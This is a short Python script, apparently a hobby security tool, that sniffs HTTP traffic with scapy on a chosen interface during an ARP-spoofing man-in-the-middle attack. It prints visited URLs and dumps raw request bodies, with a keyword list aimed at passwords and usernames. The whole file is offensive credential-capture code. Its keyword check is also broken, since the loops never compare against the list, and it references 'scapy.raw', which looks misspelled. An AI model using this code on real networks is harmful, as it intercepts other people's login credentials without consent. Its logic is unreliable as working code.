#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-04-2022
#Description: HTTP sniffer. Must have the arpspoofer and forwarding enable for this program to work

import scapy.all as scapy
from scapy_http import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_packets)
def process_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print(url)
		if packet.haslayer(scapy.raw):
			load = packet[scapy.raw].load
			for i in words:
				for i in str(load):
					print(load)
					break
			
words = ["password","user","username","login","User","Pass","Password","Login","Username","Usr","usr","pswd","Pswd"]
interface = input("[*] Enter the interface to sniff on: ")
sniff(interface) 
